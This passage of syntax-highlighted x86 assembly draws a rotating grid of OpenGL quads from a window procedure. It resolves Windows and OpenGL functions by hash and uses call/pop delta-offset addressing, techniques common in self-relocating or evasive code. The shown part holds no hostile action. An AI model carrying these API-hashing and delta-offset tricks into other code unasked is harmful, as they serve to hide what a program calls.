</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">084F77E3Dh</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k382</span><span class="sc0">           </span><span class="sc1">; glViewport</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">01701h</span><span class="sc0">
</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">0CC25D186h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k385</span><span class="sc0">           </span><span class="sc1">; glMatrixMode</span><span class="sc0">

</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">0B7550A81h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k387</span><span class="sc0">           </span><span class="sc1">; glLoadIdentity</span><span class="sc0">

</span><span class="sc1">; glu perspective</span><span class="sc0">

</span><span class="sc5">pushfl</span><span class="sc0">  </span><span class="sc2">250.000001</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">
</span><span class="sc5">pushfl</span><span class="sc0">  </span><span class="sc2">1.000001</span><span class="sc4">,</span><span class="sc5">d2</span><span class="sc0">
</span><span class="sc5">pushfl</span><span class="sc0">  </span><span class="sc2">1.6</span><span class="sc4">,</span><span class="sc5">d3</span><span class="sc0">
</span><span class="sc5">pushfl</span><span class="sc0">  </span><span class="sc2">45.00001</span><span class="sc4">,</span><span class="sc5">d4</span><span class="sc0">

</span><span class="sc5">P_apicall</span><span class="sc0">   </span><span class="sc2">052CF8CB5h</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                </span><span class="sc1">; gluPerspective                </span><span class="sc0">
                            </span><span class="sc1">; me the conversion</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">01D01h</span><span class="sc0">
</span><span class="sc5">P_apicall</span><span class="sc0">   </span><span class="sc2">06F425C00h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                </span><span class="sc1">; glShadeModel</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">skipResizing</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">umsgval</span><span class="sc4">],</span><span class="sc2">0Fh</span><span class="sc0">         </span><span class="sc1">; WM_PAINT</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipPaint</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4100h</span><span class="sc0">
</span><span class="sc5">P_apicall</span><span class="sc0">   </span><span class="sc2">0EB925D0h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">             </span><span class="sc1">; glClear</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">01700h</span><span class="sc0">
</span><span class="sc5">P_apicall</span><span class="sc0">   </span><span class="sc2">0CC25D186h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                </span><span class="sc1">; glMatrixMode</span><span class="sc0">

</span><span class="sc5">P_apicall</span><span class="sc0">   </span><span class="sc2">0B7550A81h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                </span><span class="sc1">; glLoadIdentity</span><span class="sc0">

</span><span class="sc5">pushfl</span><span class="sc0">  </span><span class="sc2">1.00001</span><span class="sc4">,</span><span class="sc5">c1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">

</span><span class="sc5">makeit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">makeit</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

</span><span class="sc5">makethat</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">pushfl</span><span class="sc0">  </span><span class="sc2">10.00001</span><span class="sc4">,</span><span class="sc5">c7</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">makethat</span><span class="sc0">

</span><span class="sc5">P_apicall</span><span class="sc0">   </span><span class="sc2">0B40F59E3h</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                    </span><span class="sc1">; gluLookAt</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getNear</span><span class="sc0">
</span><span class="sc5">getNear</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">LightPosition</span><span class="sc4">-</span><span class="sc5">getNear</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">01203h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4000h</span><span class="sc0">
</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">0AF5F0533h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k440</span><span class="sc0">               </span><span class="sc1">; glLightfv</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">drawme1</span><span class="sc0">
</span><span class="sc5">drawme1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">drawme</span><span class="sc4">-</span><span class="sc5">drawme1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">0B03D1463h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k462</span><span class="sc0">       </span><span class="sc1">; glRotated</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       push    01202h</span><span class="sc0">
</span><span class="sc1">;       push    0408h</span><span class="sc0">
</span><span class="sc1">;       call    glColorMaterial</span><span class="sc0">
</span><span class="sc1">;       </span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        
        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">fadd</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">0AE59E423h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k491</span><span class="sc0">       </span><span class="sc1">; glColor4d</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7</span><span class="sc0">                   </span><span class="sc1">; GL_QUADS</span><span class="sc0">
        </span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">0EB83BB0h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k494</span><span class="sc0">        </span><span class="sc1">; glBegin</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; reset X coordinates</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; taaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaam</span><span class="sc0">

</span><span class="sc1">;       int 3</span><span class="sc0">

        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc7">fadd</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-(</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc7">fadd</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-(</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc7">fadd</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">DrawAll2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">calcpos</span><span class="sc4">-</span><span class="sc5">drawme</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
</span><span class="sc5">DrawAll1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+(</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)-(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;       mov dword ptr [edx+8+8],0</span><span class="sc0">
</span><span class="sc1">;       mov dword ptr [edx+8+8+4],0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">456</span><span class="sc0">
</span><span class="sc5">DrawAll</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DrawCarre</span><span class="sc0">

        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">fsub</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">DrawAll</span><span class="sc0">

        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">fsub</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">DrawAll1</span><span class="sc0">

        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">fsub</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">DrawAll2</span><span class="sc0">

</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">03AE8A0h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k566</span><span class="sc0">             </span><span class="sc1">; glEnd</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">hwndval</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">02ACB18h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">k569</span><span class="sc0">             </span><span class="sc1">; GetDC</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">0424E4ADFh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc5">k572</span><span class="sc0">           </span><span class="sc1">; SwapBuffers</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">skipPaint</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">lpamval</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">wpamval</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">umsgval</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">hwndval</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">023ED6274h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">k583</span><span class="sc0">           </span><span class="sc1">; DefWindowProcA</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">DrawCarre</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">testpos</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Drawcasse</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Drawcasse</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Z coord</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Y coord</span><span class="sc0">
</span><span class="sc7">fadd</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

